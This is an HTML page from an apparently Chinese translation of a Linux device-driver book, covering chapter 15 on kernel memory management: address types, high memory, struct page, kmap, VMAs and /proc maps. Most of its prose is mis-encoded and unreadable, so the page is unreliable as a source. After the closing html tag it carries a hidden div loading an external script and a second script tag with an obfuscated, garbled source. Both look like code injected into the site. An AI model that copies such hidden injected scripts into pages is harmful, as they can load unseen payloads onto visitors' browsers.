<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;15&#160;&#160;ڴӳ DMA -Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch14s09.html" title="14.9.&#160;ٲο">
<link rel="next" href="ch15s02.html" title="15.2.&#160;mmap 豸">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;15&#160;&#160;ڴӳ DMA </th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch14s09.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch15s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="MemoryMappingandDMA.chap"></a>&#160;15&#160;&#160;ڴӳ DMA </h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch15.html#MemoryManagementinLinux.sect1">15.1. Linux еڴ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch15.html#AddressTypes.sect2">15.1.1. ַ</a></span></dt>
<dt><span class="sect2"><a href="ch15.html#PhsicalAddressesandPages.sect2">15.1.2. ַҳ</a></span></dt>
<dt><span class="sect2"><a href="ch15.html#HighandLowMemory.sect2">15.1.3. ߺ͵ڴ</a></span></dt>
<dt><span class="sect2"><a href="ch15.html#TheMemoryMapandStructPage.sect2">15.1.4. ڴӳ struct page</a></span></dt>
<dt><span class="sect2"><a href="ch15.html#PageTables.sect2">15.1.5. ҳ</a></span></dt>
<dt><span class="sect2"><a href="ch15.html#VirtualMemoryAreas.sect2">15.1.6. ڴ</a></span></dt>
<dt><span class="sect2"><a href="ch15.html#TheProcessMemoryMap.sect2">15.1.7. ڴӳ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch15s02.html">15.2. mmap 豸</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch15s02.html#Usingremap_pfn_range.sect2">15.2.1. ʹ remap_pfn_range</a></span></dt>
<dt><span class="sect2"><a href="ch15s02.html#ASimpleImplementation.sect2">15.2.2. һ򵥵ʵ</a></span></dt>
<dt><span class="sect2"><a href="ch15s02.html#AddingVMAOperations.sect2">15.2.3.  VMA Ĳ</a></span></dt>
<dt><span class="sect2"><a href="ch15s02.html#MappingMemorywithnopage.sect2">15.2.4. ʹ nopage ӳڴ</a></span></dt>
<dt><span class="sect2"><a href="ch15s02.html#RemappingSpecificIORegions.sect2">15.2.5. ӳض I/O </a></span></dt>
<dt><span class="sect2"><a href="ch15s02.html#RemappingRAM.sect2">15.2.6. ӳ RAM</a></span></dt>
<dt><span class="sect2"><a href="ch15s02.html#RemappingKernelVirtualAddresses.sect2">15.2.7. ӳںַ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch15s03.html">15.3. ֱ I/O</a></span></dt>
<dd><dl><dt><span class="sect2"><a href="ch15s03.html#AsynchronousIO.sect2">15.3.1. 첽 I/O</a></span></dt></dl></dd>
<dt><span class="sect1"><a href="ch15s04.html">15.4. ֱڴȡ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch15s04.html#OverviewofDMADataTransfer.sect2">15.4.1. һ DMA ݴĸſ</a></span></dt>
<dt><span class="sect2"><a href="ch15s04.html#AllocationgtheDMABuffer.sect2">15.4.2.  DMA </a></span></dt>
<dt><span class="sect2"><a href="ch15s04.html#BusAddresses.sect2">15.4.3. ߵַ</a></span></dt>
<dt><span class="sect2"><a href="ch15s04.html#TheGenericDMALayer.sect2">15.4.4. ͨ DMA </a></span></dt>
<dt><span class="sect2"><a href="ch15s04.html#DMAforISADevices.sect2">15.4.5. ISA 豸 DMA</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch15s05.html">15.5. ٲο</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch15s05.html#IntroductoryMaterial.sect2">15.5.1. Բ</a></span></dt>
<dt><span class="sect2"><a href="ch15s05.html#Implementingmmap.sect2">15.5.2. ʵ mmap</a></span></dt>
<dt><span class="sect2"><a href="ch15s05.html#ImplementingDirectIO.sect2">15.5.3. ʵֱ I/O</a></span></dt>
<dt><span class="sect2"><a href="ch15s05.html#DirectMemoryAccess.sect2">15.5.4. ֱڴȡ</a></span></dt>
</dl></dd>
</dl>
</div>
<p>о Linux ڴĲ, صڶ豸õļ. ͵ҪһЩڴϵͳι; ڱ漰Ĳͷ, ӸӺܹؼϵͳһ. ڴϵͳҲ Linux ں˺ĵķǳȤĲ, , ֵһ.</p>
<p>µĲϷΪ 3 :</p>
<div class="itemizedlist"><ul type="disc">
<li><p>һ漰 mmap ϵͳõʵ, 豸ڴֱӳ䵽һû̵ַռ. е豸Ҫ mmap ֧, , һЩ, ӳ豸ڴɲɹ۵.</p></li>
<li><p>ǽſķ߽, öֱӴȡûռ. Ҫ; ڴ󲿷, ںӳ֪. ˽ӳûռڴ浽ں(ʹ get_user_pages).</p></li>
<li><p>һںֱڴȡ( DMA ) I/O , ṩϵͳڴֱӴȡ.</p></li>
</ul></div>
<p>Ȼ, ЩҪһ Linux ڴι, ǴӶϵͳʼ.</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="MemoryManagementinLinux.sect1"></a>15.1.&#160;Linux еڴ</h2></div></div></div>
<p>ϵͳڴ, ͼָ Linux ʵֵҪص. 㲻һλ Linux ڴרʵ mmap, һιĻ˽õ. һ൱Ķںʹڴݽṹ. һҪıѱ, Ǿͽʹṹ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AddressTypes.sect2"></a>15.1.1.&#160;ַ</h3></div></div></div>
<p>Linux , Ȼ, һڴϵͳ, ζûĵֱַӶӦӲʹõַ. ڴһӲ, . ڴ, ϵͳеĳԷԶϿõڴ; ȷʵ, һ̿ӵһַռϵͳڴ. ڴҲԽ̵ĵַռöּ, ӳԱڴ浽豸ڴ.</p>
<p>, Ѿַ, ϸڱڸǹȥ. Linux ϵͳ͵ĵַ, ÿԼĺ. ҵ, ں˴벻һֱǳȷеÿʹʲô͵صַ, ˳ԱС.</p>
<p>һ Linux ʹõĵַб. ͼ <a href="ch15.html#ldd3-15-1.fig" title="ͼ&#160;15.1.&#160;Linux ʹõĵַ">Linux ʹõĵַ</a>ʾַιڴ.</p>
<div class="figure">
<a name="ldd3-15-1.fig"></a><p class="title"><b>ͼ&#160;15.1.&#160;Linux ʹõĵַ</b></p>
<div><img src="images/snagitldd3/ldd3-15-1.png" alt="Linux ʹõĵַ"></div>
</div>
<div class="variablelist"><dl>
<dt><span class="term"><span>User virtual addresses </span></span></dt>
<dd><p>Ǳûĳַ. ûַڳ 32 λ 64 λ, ײӲṹ, ÿԼַռ.</p></dd>
<dt><span class="term"><span>Physical addresses </span></span></dt>
<dd><p>ڴϵͳڴ֮ʹõĵַ. ַ 32-  64-λ;  32-λϵͳĳЩ¿ʹøַ.</p></dd>
<dt><span class="term"><span>Bus addresses </span></span></dt>
<dd><p>ڴ֮ʹõĵַ. , Ǻͱʹõַͬ, ⲻǱҪ. һЩϵṩһ I/O ڴԪ(IOMMU), ߺڴ֮ӳַ. һ IOMMU öַʹ(, ʹɢڴеĻ豸, ), ǵ趨 DMA ʱ IOMMU һĶĲ. ߵַǸ߶, Ȼ.</p></dd>
<dt><span class="term"><span>Kernel logical addresses </span></span></dt>
<dd><p>Щں˵ַռ. Щַӳ˲(Ҳȫ)沢ҳڴԴ. ڴ󲿷ֵϵ, ߼ַǵַֻһƫ. ߼ַʹӲıָС, , ܲװ 32-λϵͳѰַеڴ. ߼ַ洢 unsigned long  void * ͵ı.  kmalloc صڴں߼ַ.</p></dd>
<dt><span class="term"><span>Kernel virtual addresses </span></span></dt>
<dd><p>ںַ߼ַ, ǶǴں˿ռַַӳ. ںַ߼ַռ߱Ե, һһַӳ, . е߼ַںַ, ںַ߼ַ. , vmalloc ڴַ(ûֱӳ). kmap (Ժ)Ҳַ. ַ洢ָ.</p></dd>
</dl></div>
<p>߼ַ,  __pa() (  &lt;asm/page.h&gt; ж)Ĺַ. ַɱӳ߼ַʹ __va(), ֻڴҳ.</p>
<p>ͬں˺Ҫͬ͵ַ. вͬ C ͱܲ, ĵַȷ, ûĺ. ڱ, Ǿʹ͵ַ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PhsicalAddressesandPages.sect2"></a>15.1.2.&#160;ַҳ</h3></div></div></div>
<p>ڴ汻ΪɢĵԪΪҳ. ϵͳڲڴ洦ڰҳĻ. ҳСһϵͬһ, ܴ󲿷ϵͳǰʹ 4096-ֽڵҳ.  PAGE_SIZE ( &lt;asm/page.h&gt;) ҳСκθϵ.</p>
<p>鿴һڴַ -  - ɷΪһҳźһҳڵƫ. ʹ 4096-ֽҳ, , 12 λЧλƫ, ʣµ, λָʾҳ. 㶪ƫƲƶʣµĲ offset λ, Ϊһҳ֡ (PFN). λҳ֡ź͵ַ֮תһ൱ͨĲ.  PAGE_SHIFT ߱ƶλת.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="HighandLowMemory.sect2"></a>15.1.3.&#160;ߺ͵ڴ</h3></div></div></div>
<p>߼ںַ֮Ĳͬ䱸ڴ 32-λϵͳбͻ.  32 λ, Ѱַ 4 G ڴ. , ֱ,  32-λ ϵͳ Linux ƱǸٺܶڴ, Ϊַķʽ.</p>
<p>ں(  x86 ϵ, ȱʡ) ûռں֮仮 4-G ַ;  2 ʹͬһӳ. һ͵Ļֳַ 3 GB ûռ,  1 GB ں˿ռ. <sup>[<a name="id495351" href="#ftn.id495351">47</a>]</sup>ں˵ĴݽṹҪʺռ, ں˵ַռڴӳ. ں˲ֱӲûӳ䵽ں˵ĵַռ. ں, 仰˵, ҪԼַκֱӽӴڴ. , , ܹں˴ĵڴܹӳ䵽ַں˲ֵ, ȥں˴ҪĿռ. ,  x86  Linux ϵͳԹС 1 GB ڴ.</p>
<p>ΪӦԸڴҵѹƻ 32-λ Ӧúϵͳļ, Ѿ"ַչ"ԵǵĲƷ. , ,  32-λ ҲܹѰַ 4GB ڴ. , ڴɱֱ߼ַӳƻ. ڴͲ(ϵ 1  2 GB, Ӳں)߼ַ; ʣµ(ڴ)û. ڴȡһضߵַҳ֮ǰ, ں˱뽨һȷӳʹҲں˵ַռ. , ںݽṹڵڴ; ڴΪûҳ.</p>
<p>"ڴ"Щ˿ɻ, رΪ PC ĺ. , Ϊ, ǽЩ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>Low memory </span></span></dt>
<dd><p>߼ַں˿ռдڵڴ. ڴ󲿷ÿϵͳܻ, еڴ涼ǵڴ.</p></dd>
<dt><span class="term"><span>High memory </span></span></dt>
<dd><p>߼ַڵڴ, ΪΪںַõĵַΧ֮.</p></dd>
</dl></div>
<p> i386 ϵͳ, ͺ͸ڴ֮ķֽ糣ڸո 1 GB ֮, Ǹ߽ںʱɱı. ߽ԭʼ PC еϵ 640 KB ûκι, λòӲ涨. ෴, , ںõһƵں˺ûռ֮仮 32-λַռʱ.</p>
<p>ǽָʹøڴ, ڱʱ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheMemoryMapandStructPage.sect2"></a>15.1.4.&#160;ڴӳ struct page</h3></div></div></div>
<p>ʷ, ںʹ߼ַڴҳ. ڴֵ֧, , ѱ¶һԵ -- ߼ַԸڴ治. , ڴں˺ʹָ struct page ָ( &lt;linux/mm.h&gt; ж). ݽṹֻںҪ֪Ĺڴ.</p>
<p>2.6 ں(һӵĲ)֧һ "4G/4G" ģʽ x86 Ӳ, ΢ܴۻں˺ûַռ.</p>
<p>ϵͳÿһҳһ struct page. ṹһЩԱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>atomic_t count;</span></span></dt>
<dd><p>ҳ.  count  0, ҳظб.</p></dd>
<dt><span class="term"><span>void *virtual;</span></span></dt>
<dd><p>ҳںַ, ӳ; , NULL. ڴҳһֱӳ; ڴҳ. Աϵϳ; ֻͨҳںַ޷׼ʱ. 鿴Ա, ȷķʹ page_address , .</p></dd>
<dt><span class="term"><span>unsigned long flags;</span></span></dt>
<dd><p>һҳ״̬һλ־. Щ PG_locked, ָʾҳڴѱ, Լ PG_reserved, ֹڴϵͳʹøҳ.</p></dd>
</dl></div>
<p>кܶϢ struct page , ڴĸĺħһֲҺд޹.</p>
<p>ںάһ struct page ϵͳڴ. ĳЩϵͳ, һΪ mem_map. , ĳЩϵͳ, Ӹ. һڴȡ( NUMA )ϵͳЩкܴڴĿжһڴӳ, ˴ǿֲĴκοʱӦֱӶȡ. ˵, ֻʹ struct page ָ볣Ƿǳ, õ.</p>
<p>Щͺ걻 struct page ַָ֮ת:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>struct page *virt_to_page(void *kaddr);</span></span></dt>
<dd><p>,  &lt;asm/page.h&gt;, һں߼ַı struct page ָ. ΪҪһ߼ַ, ʹ vmalloc ڴ߸ڴ.</p></dd>
<dt><span class="term"><span>struct page *pfn_to_page(int pfn);</span></span></dt>
<dd><p>Ϊҳ֡ŷ struct page ָ. Ҫ, ڴݸ pfn_to_page ֮ǰʹ pfn_valid һҳ֡ŵЧ.</p></dd>
<dt><span class="term"><span>void *page_address(struct page *page);</span></span></dt>
<dd><p>ҳںַ, һַ. ڸڴ, ǸַҳѱӳŴ.  &lt;linux/mm.h&gt; ж. 󲿷, ʹ kmap һ汾 page_address.</p></dd>
<dt><span class="term"><span>#include &lt;linux/highmem.h&gt;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void *kmap(struct page *page);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void kunmap(struct page *page);</span></span></dt>
<dd><p>kmap Ϊϵͳеκҳһںַ. ڵڴҳ, ֻҳ߼ַ; ڸڴ, kmap ں˵ַռһרòдһӳ. ʹ kmap ӳӦһֱʹ kunmap ͷ;һĿӳ, òҪ̫ͣʱ. kmap άһ,  2  ͬһҳϵ kmap, ȷ鷢. Ҫע kmap ˯ߵûӳʱ.</p></dd>
<dt><span class="term"><span>#include &lt;linux/highmem.h&gt;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>#include &lt;asm/kmap_types.h&gt;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void *kmap_atomic(struct page *page, enum km_type type);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void kunmap_atomic(void *addr, enum km_type type);</span></span></dt>
<dd><p>kmap_atomic  kmap һָʽ. ÿϵԭӵ kmaps άһСв( רõҳ); һ kmap_atomic ĵ߱ type и֪ϵͳʹЩеĸ. Ψһ KM_USER0  KM_USER1 (ֱӴûռĵеĴ), Լ KM_IRQ0  KM_IRQ1(жϴ). עԭӵ kmaps 뱻ԭӵش; Ĵ벻ڳһʱ˯. Ҫעںûʲôֹ 2 ͼʹͬһڲ໥( ÿ CPU жصһײ). ʵ, ԭӵ kmap ڵľǸ.</p></dd>
</dl></div>
<p>ڱºͺ½еǽӴʱ, ǿЩһЩʹ, </p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PageTables.sect2"></a>15.1.5.&#160;ҳ</h3></div></div></div>
<p>κִϵͳ, һתַĶӦַ. ƱΪһҳ; һ༶ͽṹ, --ӳͼı־. Linux ںάһҳûֱʹҳϵ.</p>
<p>豸ͨ漰ҳ. ˵Ƕ, 2.6 ںѾȥκֱʹҳҪ. , ǲǵκϸ; Ķ߿һ Understanding The Linux Kernel ˽,  Daniel P. Bovet  Marco Cesati (O' Reilly).</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="VirtualMemoryAreas.sect2"></a>15.1.6.&#160;ڴ</h3></div></div></div>
<p>ڴ( VMA )һ̵ĵַռĶںݽṹ. һ VMA һ̵ڴһͬ: һͬɱ־ͱͬ(, һļ߽ռ)ֵַ֧Χ. ɢضӦһ""ĸ, ܿԸõΪ"һԼԵڴ". һ̵ڴӳ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>Ŀִд(Ϊ text)һ.</p></li>
<li><p>ݵĶ, ʼ(һȷıֵ, ִпʼ), δʼ(BBS), <sup>[<a name="id495847" href="#ftn.id495847">48</a>]</sup>Լջ.</p></li>
<li><p>ÿڴӳһ.</p></li>
</ul></div>
<p>һ̵ڴɿͨ /proc/&lt;pid/maps&gt;( pid, Ȼ, һ̵ ID 滻). /proc/self һ /proc/id , Ϊָǰ. Ϊһ, Ǽڴӳ(˼ע)</p>
<pre class="screen">
# cat /proc/1/maps look at init
08048000-0804e000 r-xp 00000000 03:01 64652 
0804e000-0804f000 rw-p 00006000 03:01 64652 
0804f000-08053000 rwxp 00000000 00:00 0
40000000-40015000 r-xp 00000000 03:01 96278 
40015000-40016000 rw-p 00014000 03:01 96278 
40016000-40017000 rw-p 00000000 00:00 0
42000000-4212e000 r-xp 00000000 03:01 80290 
4212e000-42131000 rw-p 0012e000 03:01 80290 
42131000-42133000 rw-p 00000000 00:00 0
bffff000-c0000000 rwxp 00000000 00:00 0
ffffe000-fffff000 ---p 00000000 00:00 0

/sbin/init text /sbin/init data zero-mapped BSS /lib/ld-2.3.2.so text /lib/ld-2.3.2.so data BSS for ld.so /lib/tls/libc-2.3.2.so text /lib/tls/libc-2.3.2.so data BSS for libc Stack segment vsyscall page 
# rsh wolf cat /proc/self/maps #### x86-64 (trimmed)
00400000-00405000 r-xp 00000000 03:01 1596291 /bin/cat text
00504000-00505000 rw-p 00004000 03:01 1596291 /bin/cat data
00505000-00526000 rwxp 00505000 00:00 0 bss
3252200000-3252214000 r-xp 00000000 03:01 1237890 /lib64/ld-2.3.3.so
3252300000-3252301000 r--p 00100000 03:01 1237890 /lib64/ld-2.3.3.so
3252301000-3252302000 rw-p 00101000 03:01 1237890 /lib64/ld-2.3.3.so
7fbfffe000-7fc0000000 rw-p 7fbfffe000 00:00 0 stack
ffffffffff600000-ffffffffffe00000 ---p 00000000 00:00 0 vsyscall
</pre>
<p>ÿеֶ:</p>
<pre class="screen">
start-end perm offset major:minor inode image 
</pre>
<p>ÿ /proc/*/maps (ӳ) Ӧ struct vm_area_struct еһԱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>start end </span></span></dt>
<dd><p>ڴĿʼͽַ.</p></dd>
<dt><span class="term"><span>perm </span></span></dt>
<dd><p>ڴĶ,дִɵλ. Ա̿Զҳʲô. ԱһַҪôǸ"˽" p ҪôǸ"" s.</p></dd>
<dt><span class="term"><span>offset </span></span></dt>
<dd><p>ڴӳ䵽ļеʼλ. 0 ƫζڴʼӦļĿʼ.</p></dd>
<dt><span class="term"><span>major minor </span></span></dt>
<dd><p>ѱӳļ豸α. ׻, 豸ӳ, αָǳбû򿪵豸ļĴ̷, 豸.</p></dd>
<dt><span class="term"><span>inode </span></span></dt>
<dd><p>ӳļ inode .</p></dd>
<dt><span class="term"><span>image </span></span></dt>
<dd><p>ѱӳļ((һִӳ).</p></dd>
</dl></div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Thevm_area_structstructure.sect3"></a>15.1.6.1.&#160;vm_area_struct ṹ</h4></div></div></div>
<p>һûռ̵ mmap ӳ豸ڴ浽ĵַռ, ϵͳͨһ VMA ǸӳӦ. һ֧ mmap (, , ʵ mmap )ҪǸǸ VMA ĳʼ. дӦ, , Ϊ֧ mmap Ӧж VMA ٵ.</p>
<p>ǿ struct vm_area_struct ҪĳԱ(  &lt;linux/mm.h&gt; ж). ЩԱӦ豸ǵ mmap ʵʹ. עںά VMA Ż,  vm_area_struct ļԱά֯. , VMA һⴴ, ṹƻ. VMA ҪԱ(עЩԱǸտ /proc ֮)</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>unsigned long vm_start;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>unsigned long vm_end;</span></span></dt>
<dd><p> VMA ǵַΧ. ЩԱ /proc/*/mapsгֵͷ 2 ֶ.</p></dd>
<dt><span class="term"><span>struct file *vm_file;</span></span></dt>
<dd><p>һָ(һ) struct file ṹָ.</p></dd>
<dt><span class="term"><span>unsigned long vm_pgoff;</span></span></dt>
<dd><p>ļƫ, ҳ. һļ豸ӳ, ӳĵһҳļλ.</p></dd>
<dt><span class="term"><span>unsigned long vm_flags;</span></span></dt>
<dd><p>һױ־. 豸дȤı־ VM_IO  VM_RESERVUED. VM_IO ־һ VMA Ϊڴӳ I/O . , VM_IO ־ֹڽ̺ת. VM_RESERVED ֪ڴϵͳҪͼ VMA; Ӧڴ󲿷豸ӳ.</p></dd>
<dt><span class="term"><span>struct vm_operations_struct *vm_ops;</span></span></dt>
<dd><p>һ׺, ں˿ܻڴϲ. Ĵָʾڴһں"", Ѿȫʹõ struct file.</p></dd>
<dt><span class="term"><span>void *vm_private_data;</span></span></dt>
<dd><p>洢ϢĳԱ.</p></dd>
</dl></div>
<p> struct vm_area_struct, vm_operations_struct  &lt;linux/mm.h&gt;; гĲ. ЩΨһҪ̵ڴҪ, Ա˳г. º, һЩЩʵ.</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>void (*open)(struct vm_area_struct *vma);</span></span></dt>
<dd><p>open ں˵ʵ VMA ϵͳʼ. κʱһµ VMA( һ½, ). һǵ VMA һα mmap ʱ; ,  mmap .</p></dd>
<dt><span class="term"><span>void (*close)(struct vm_area_struct *vma);</span></span></dt>
<dd><p>һ, ں˵Ĺرղ. עûʹü VMA; ֻʹÿ̴򿪺͹رһ.</p></dd>
<dt><span class="term"><span>struct page *(*nopage)(struct vm_area_struct *vma, unsigned long address, int *type);</span></span></dt>
<dd><p>һͼȡʹһЧ VMA ҳ, ǰڴ, nopage ()ص.  struct page ָҳ, Ҳڴӵ 2 洢жȡ֮.  nopage ûΪ, һҳں˷.</p></dd>
<dt><span class="term"><span>int (*populate)(struct vm_area_struct *vm, unsigned long address, unsigned long len, pgprot_t prot, unsigned long pgoff, int nonblock);</span></span></dt>
<dd><p>ں"Ԥ"ҳڴ, Ǳûռȡ֮ǰ. ͨûбҪʵ䷽.</p></dd>
</dl></div>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheProcessMemoryMap.sect2"></a>15.1.7.&#160;ڴӳ</h3></div></div></div>
<p>ڴ󲿷ǽڴӳṹ, ݽṹһ. ÿϵͳеĽ(˼ں˿ռ߳)һ struct mm_struct (  &lt;linux/sched.h&gt;), н̵ڴб, ҳ, ͸ڴϢ, һ( mmap_sem )һ( page_table_lock ). ṹָṹ; ںٵҪȡ, ͨķʹ current-&gt;mm. עڴṹڽ֮乲; Linux ̵߳ʵַʽ, .</p>
<p>ܽǶ Linux ڴݽṹ. Щ, ڿԼ mmap ϵͳõʵ.</p>
</div>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id495351" href="#id495351">47</a>] </sup>-x86ϵЧûں/ûռĻ, ǿ 32-λϵͳʹֱ 4-GB ں˵ַռ.  , Ȼϵͳװж 4GB ڴʱ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id495847" href="#id495847">48</a>] </sup>BSS һϵĻʷ, ˼"ɷſʼĿ". ִļ BSS β洢ڴ, ںӳҳ BSS ַΧ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch14s09.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch15s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">14.9.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;15.2.&#160;mmap 豸</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>